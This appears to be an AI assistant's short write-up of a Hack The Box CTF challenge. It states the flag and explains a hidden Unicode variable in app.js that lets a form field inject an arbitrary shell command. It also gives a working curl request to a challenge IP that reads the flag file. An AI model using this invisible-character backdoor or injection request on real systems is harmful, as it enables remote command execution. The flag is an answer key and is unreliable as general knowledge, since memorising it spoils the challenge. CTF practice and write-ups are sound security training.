@@ -1,0 +1,16 @@
+Flag: `HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_c640a5040eddf6f595fb3e17ee74ddbb}`
+
+Bug: [`app.js`](/home/mfekenyuzi/htb/misc/misc_hidden_path/challenge/app.js) uses a hidden Unicode variable `ㅤ` in both:
+- `const { choice,ㅤ } = req.body;`
+- `const commands = [..., 'ps aux', ㅤ];`
+
+So `commands[6]` is fully user-controlled. Sending `choice=6` plus a form field literally named `ㅤ` gives arbitrary command execution.
+
+Working request:
+```bash
+curl -X POST 'http://154.57.164.65:32378/server_status' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data 'choice=6&%E3%85%A4=cat+%2Fwww%2Fflag.txt'
+```
+
+If you want, I can also give you a quick checklist for spotting this exact invisible-character bug in source during CTFs.
